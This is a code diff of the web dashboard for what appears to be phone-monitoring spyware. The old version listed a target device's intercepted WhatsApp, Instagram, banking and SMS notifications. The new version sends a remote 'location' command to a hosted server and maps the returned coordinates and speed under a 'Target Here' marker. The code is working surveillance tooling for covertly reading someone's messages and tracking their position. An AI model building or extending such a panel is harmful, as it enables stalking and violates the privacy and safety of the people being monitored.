@@ -3,217 +3,223 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Notifications</title>
+    <title>Location Tracker</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    
     <style>
         :root {
             --bg-color: #0f0f0f;
-            --glass-bg: rgba(255, 255, 255, 0.05);
-            --glass-border: rgba(255, 255, 255, 0.1);
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --glass-border: rgba(255, 255, 255, 0.2);
             --text-main: #ffffff;
-            --text-muted: #aaaaaa;
+            --cyan: #00f3ff;
             --accent: #4caf50;
         }
 
         body {
             background-color: var(--bg-color);
-            background-image: linear-gradient(45deg, #000000, #1a1a1a);
             color: var(--text-main);
             font-family: 'Segoe UI', sans-serif;
-            margin: 0; padding: 20px;
-            min-height: 100vh; display: flex; justify-content: center;
+            margin: 0; padding: 0;
+            display: flex; flex-direction: column; height: 100vh;
         }
 
-        .container {
-            width: 100%; max-width: 600px;
-            background: rgba(0, 0, 0, 0.5); border-radius: 30px;
-            padding: 25px; border: 1px solid var(--glass-border);
-            height: fit-content; min-height: 70vh;
-        }
-
+        /* HEADER */
         .header {
+            position: absolute; top: 20px; left: 50%; transform: translateX(-50%);
+            width: 90%; max-width: 450px; z-index: 1000;
+            background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px);
+            border-radius: 20px; padding: 15px;
+            border: 1px solid var(--glass-border);
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 25px; padding-bottom: 15px;
-            border-bottom: 1px solid var(--glass-border);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
-        .back-btn {
-            text-decoration: none; color: var(--text-main); font-size: 1.2rem;
-            background: var(--glass-bg); padding: 10px 15px;
-            border-radius: 50%; border: 1px solid var(--glass-border);
+        .back-btn { color: white; font-size: 1.2rem; text-decoration: none; }
+        .title { font-weight: bold; color: var(--cyan); letter-spacing: 1px; }
+        
+        /* MAP CONTAINER */
+        #map { height: 100%; width: 100%; z-index: 1; }
+
+        /* BOTTOM INFO PANEL */
+        .info-panel {
+            position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%);
+            width: 90%; max-width: 450px; z-index: 1000;
+            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px);
+            border-radius: 25px; padding: 20px;
+            border: 1px solid var(--cyan);
+            box-shadow: 0 0 20px rgba(0, 243, 255, 0.2);
         }
 
-        .title { font-size: 1.4rem; font-weight: bold; display: flex; align-items: center; gap: 10px; }
-        .title i { color: #FF9800; } 
+        .coords-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
+        .data-box { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 10px; text-align: center; }
+        .lbl { font-size: 0.6rem; color: #aaa; text-transform: uppercase; }
+        .val { font-size: 0.9rem; font-weight: bold; color: white; }
 
-        .notif-list { display: flex; flex-direction: column; gap: 12px; }
-
-        .notif-card {
-            background: var(--glass-bg); border: 1px solid var(--glass-border);
-            border-radius: 15px; padding: 12px; display: flex;
-            align-items: center; gap: 15px; cursor: pointer; transition: 0.2s;
+        /* BUTTONS */
+        .action-row { display: flex; gap: 10px; }
+        .btn {
+            flex: 1; padding: 12px; border: none; border-radius: 12px;
+            font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;
+            transition: 0.3s;
         }
+        .btn-refresh { background: var(--glass-bg); color: white; border: 1px solid var(--glass-border); }
+        .btn-refresh:hover { background: rgba(255,255,255,0.2); }
+        
+        .btn-maps { background: var(--cyan); color: black; box-shadow: 0 0 15px var(--cyan); }
+        .btn-maps:hover { transform: translateY(-2px); box-shadow: 0 0 25px var(--cyan); }
 
-        .notif-card:hover { background: rgba(255, 255, 255, 0.1); transform: translateX(5px); }
-
-        .app-icon {
-            width: 45px; height: 45px; border-radius: 12px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 1.4rem; background: rgba(0,0,0,0.3); flex-shrink: 0;
-        }
-
-        .content { flex: 1; overflow: hidden; }
-        .sender-name { font-weight: bold; font-size: 0.95rem; color: #fff; }
-        .preview-text { font-size: 0.8rem; color: var(--text-muted); text-overflow: ellipsis; overflow: hidden; white-space: nowrap; }
-
-        .time-badge { font-size: 0.7rem; color: var(--text-muted); white-space: nowrap; }
-
-        /* Modal */
-        .modal-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8); backdrop-filter: blur(5px);
-            display: none; align-items: center; justify-content: center; z-index: 1000;
-        }
-
-        .modal-box {
-            background: #1e1e1e; width: 90%; max-width: 400px;
-            border-radius: 20px; padding: 25px; border: 1px solid var(--glass-border);
-            position: relative;
-        }
-
-        .modal-body { font-size: 1rem; line-height: 1.6; color: #e0e0e0; margin-top: 15px; word-wrap: break-word; }
-        .close-modal { position: absolute; top: 15px; right: 20px; font-size: 1.5rem; color: #aaa; cursor: pointer; }
-        .empty-state { text-align: center; padding: 50px; color: var(--text-muted); }
+        .last-seen { text-align: center; font-size: 0.7rem; color: #888; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <div class="header">
-            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-            <div class="title"><i class="fa-regular fa-bell"></i> Notifications</div>
-            <button onclick="fetchNotifications()" style="background:none; border:none; color:white; cursor:pointer; font-size:1.2rem;">
-                <i class="fa-solid fa-rotate-right"></i>
+    <div class="header">
+        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+        <div class="title"><i class="fa-solid fa-location-crosshairs"></i> LIVE TRACKER</div>
+        <div style="width: 20px;"></div> </div>
+
+    <div id="map"></div>
+
+    <div class="info-panel">
+        <div class="coords-grid">
+            <div class="data-box">
+                <div class="lbl">Latitude</div>
+                <div class="val" id="lat">--</div>
+            </div>
+            <div class="data-box">
+                <div class="lbl">Longitude</div>
+                <div class="val" id="lon">--</div>
+            </div>
+            <div class="data-box">
+                <div class="lbl">Accuracy</div>
+                <div class="val" id="acc">--</div>
+            </div>
+            <div class="data-box">
+                <div class="lbl">Speed</div>
+                <div class="val" id="spd">0 km/h</div>
+            </div>
+        </div>
+
+        <div class="action-row">
+            <button class="btn btn-refresh" onclick="fetchLocation()">
+                <i class="fa-solid fa-rotate"></i> Update
+            </button>
+            <button class="btn btn-maps" onclick="openGoogleMaps()">
+                <i class="fa-solid fa-map-location-dot"></i> Google Maps
             </button>
         </div>
-
-        <div id="notif-list" class="notif-list">
-            <div class="empty-state">
-                <i class="fa-solid fa-circle-notch fa-spin"></i>
-                <p>Connecting to Phone...</p>
-            </div>
-        </div>
+        
+        <div class="last-seen" id="lastUpdate">Waiting for signal...</div>
     </div>
 
-    <div id="detailModal" class="modal-overlay" onclick="closeModal(event)">
-        <div class="modal-box" onclick="event.stopPropagation()">
-            <span class="close-modal" onclick="closeModalDirect()">&times;</span>
-            <div id="modalHeader" style="display:flex; align-items:center; gap:10px; border-bottom:1px solid #333; padding-bottom:10px;">
-                <div id="modalIcon" class="app-icon" style="width: 35px; height: 35px; font-size: 1rem;"></div>
-                <div id="modalAppName" style="font-weight:bold;">App Name</div>
-            </div>
-            <div id="modalMessage" class="modal-body"></div>
-        </div>
-    </div>
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 
     <script>
-        const RENDER_URL = "https://child-v9no.onrender.com";
+        const API_BASE = 'https://child-v9no.onrender.com';
         
-        // --- 1. ID Fetching Logic ---
+        // 1. URL se ID uthao
         const urlParams = new URLSearchParams(window.location.search);
-        let DEVICE_ID = urlParams.get('id'); 
-        if(!DEVICE_ID) { DEVICE_ID = "UNKNOWN"; } 
+        const DEVICE_ID = urlParams.get('id');
 
-        document.addEventListener("DOMContentLoaded", () => {
-            fetchNotifications();
-            setInterval(fetchNotifications, 5000); 
+        // Map Setup
+        let map = L.map('map').setView([20.5937, 78.9629], 5); // Default India center
+        let marker;
+
+        // Dark Theme Tiles (Hacker Look)
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+            attribution: '&copy; OpenStreetMap &copy; CartoDB',
+            subdomains: 'abcd',
+            maxZoom: 20
+        }).addTo(map);
+
+        // Custom Marker Icon
+        const icon = L.divIcon({
+            className: 'custom-div-icon',
+            html: "<div style='background-color:#00f3ff; width:15px; height:15px; border-radius:50%; box-shadow:0 0 15px #00f3ff; border:2px solid white;'></div>",
+            iconSize: [20, 20],
+            iconAnchor: [10, 10]
         });
 
-        async function fetchNotifications() {
-            const listContainer = document.getElementById("notif-list");
-            
+        // 2. Fetch Location Logic
+        async function fetchLocation() {
+            const btn = document.querySelector('.btn-refresh');
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Updating...';
+
             try {
-                // --- 2. Requesting Data ---
-                const response = await fetch(`${RENDER_URL}/api/get-data/${DEVICE_ID}/notifications?t=${new Date().getTime()}`);
-                
-                if (!response.ok) throw new Error("File not found");
-                const data = await response.json();
-                
-                if (!data || data.length === 0) {
-                    listContainer.innerHTML = `<div class="empty-state"><i class="fa-solid fa-bell-slash"></i><p>No Notifications for ${DEVICE_ID}</p></div>`;
-                    return;
-                }
-
-                listContainer.innerHTML = ""; 
-                
-                // --- 3. Sorting Fix: Removed .reverse() ---
-                // Server naya data pehle hi top par bhejta hai, isliye reverse hataya
-                data.forEach(notif => {
-                    
-                    // Matching Keys with Android App
-                    const pkgName = notif.packageName || notif.app || "system";
-                    const appInfo = getAppStyle(pkgName);
-                    
-                    // Time Formatting
-                    let timeStr = "Just now";
-                    const timestamp = notif.postTime || notif.time;
-                    if(timestamp) {
-                        timeStr = new Date(parseInt(timestamp)).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'});
-                    }
-
-                    const card = document.createElement("div");
-                    card.className = "notif-card";
-                    card.onclick = () => openModal(appInfo, notif.title, notif.text);
-
-                    card.innerHTML = `
-                        <div class="app-icon" style="color: ${appInfo.color}; border: 1px solid ${appInfo.color}40;">
-                            <i class="${appInfo.icon}"></i>
-                        </div>
-                        <div class="content">
-                            <div class="sender-name">${notif.title || "System Notification"}</div>
-                            <div class="preview-text">${notif.text || "Click to see content"}</div>
-                        </div>
-                        <div class="time-badge">${timeStr}</div>
-                    `;
-                    listContainer.appendChild(card);
+                // Pehle command bhejo taaki phone fresh location bheje
+                await fetch(`${API_BASE}/api/send-command`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: DEVICE_ID, command: 'location' })
                 });
 
+                // 2 second wait karke data fetch karo
+                setTimeout(async () => {
+                    const res = await fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/location?t=${Date.now()}`);
+                    const data = await res.json();
+                    
+                    // Agar data list hai, toh latest wala lo
+                    const loc = Array.isArray(data) ? data[data.length - 1] : data;
+
+                    if (loc && loc.lat) {
+                        updateMap(loc.lat, loc.lon, loc.accuracy, loc.speed, loc.time);
+                    } else {
+                        document.getElementById('lastUpdate').innerText = "No location data found yet.";
+                    }
+                    
+                    btn.innerHTML = '<i class="fa-solid fa-rotate"></i> Update';
+                }, 3000); // 3 sec delay for device to upload
+
             } catch (err) {
-                console.log(err);
-                if(listContainer.innerHTML.includes("Connecting")) {
-                     listContainer.innerHTML = `<div class="empty-state"><p>Waiting for data from ${DEVICE_ID}...</p></div>`;
-                }
+                console.error(err);
+                btn.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i> Error';
             }
         }
 
-        // --- 4. Icons Logic ---
-        function getAppStyle(pkg) {
-            if(!pkg) return { icon: 'fa-solid fa-bell', color: '#ffffff', name: 'System' };
-            const p = pkg.toLowerCase();
+        // 3. Update UI
+        function updateMap(lat, lon, acc, spd, time) {
+            // Text Update
+            document.getElementById('lat').innerText = parseFloat(lat).toFixed(4);
+            document.getElementById('lon').innerText = parseFloat(lon).toFixed(4);
+            document.getElementById('acc').innerText = acc ? Math.round(acc) + " m" : "--";
+            document.getElementById('spd').innerText = spd ? Math.round(spd * 3.6) + " km/h" : "0 km/h";
             
-            if (p.includes("whatsapp")) return { icon: 'fa-brands fa-whatsapp', color: '#25D366', name: 'WhatsApp' };
-            if (p.includes("instagram")) return { icon: 'fa-brands fa-instagram', color: '#E1306C', name: 'Instagram' };
-            if (p.includes("facebook")) return { icon: 'fa-brands fa-facebook', color: '#1877F2', name: 'Facebook' };
-            if (p.includes("snapchat")) return { icon: 'fa-brands fa-snapchat', color: '#FFFC00', name: 'Snapchat' };
-            if (p.includes("youtube")) return { icon: 'fa-brands fa-youtube', color: '#FF0000', name: 'YouTube' };
-            if (p.includes("telegram")) return { icon: 'fa-brands fa-telegram', color: '#229ED9', name: 'Telegram' };
-            if (p.includes("paytm")) return { icon: 'fa-solid fa-wallet', color: '#00BAF2', name: 'Paytm' };
-            if (p.includes("phonepe")) return { icon: 'fa-solid fa-indian-rupee-sign', color: '#6739B7', name: 'PhonePe' };
-            if (p.includes("message") || p.includes("mms")) return { icon: 'fa-solid fa-comment-sms', color: '#4CAF50', name: 'Messages' };
-            
-            return { icon: 'fa-solid fa-cube', color: '#aaaaaa', name: 'App' };
+            const timeStr = new Date(parseInt(time)).toLocaleString();
+            document.getElementById('lastUpdate').innerText = "Last Updated: " + timeStr;
+
+            // Map Update
+            const newLatLng = [lat, lon];
+            map.flyTo(newLatLng, 16, { animate: true, duration: 1.5 });
+
+            if (marker) {
+                marker.setLatLng(newLatLng);
+            } else {
+                marker = L.marker(newLatLng, { icon: icon }).addTo(map)
+                    .bindPopup(`<b>Target Here</b><br>${timeStr}`).openPopup();
+            }
         }
 
-        function openModal(appInfo, sender, message) {
-            document.getElementById("modalIcon").innerHTML = `<i class="${appInfo.icon}"></i>`;
-            document.getElementById("modalIcon").style.color = appInfo.color;
-            document.getElementById("modalAppName").innerText = appInfo.name;
-            document.getElementById("modalMessage").innerHTML = `<strong>${sender || ""}</strong><br>${message || ""}`;
-            document.getElementById("detailModal").style.display = "flex";
+        // Open in Google Maps App
+        function openGoogleMaps() {
+            const lat = document.getElementById('lat').innerText;
+            const lon = document.getElementById('lon').innerText;
+            if(lat === '--') return alert("Wait for location to load!");
+            
+            window.open(`https://www.google.com/maps/search/?api=1&query=${lat},${lon}`, '_blank');
         }
 
-        function closeModal(e) { if (e.target.id === "detailModal") closeModalDirect(); }
-        function closeModalDirect() { document.getElementById("detailModal").style.display = "none"; }
+        // Start
+        window.onload = () => {
+            if(!DEVICE_ID) {
+                alert("No ID provided!");
+                window.location.href = 'index.html';
+                return;
+            }
+            fetchLocation();
+        };
+
     </script>
 </body>
 </html>
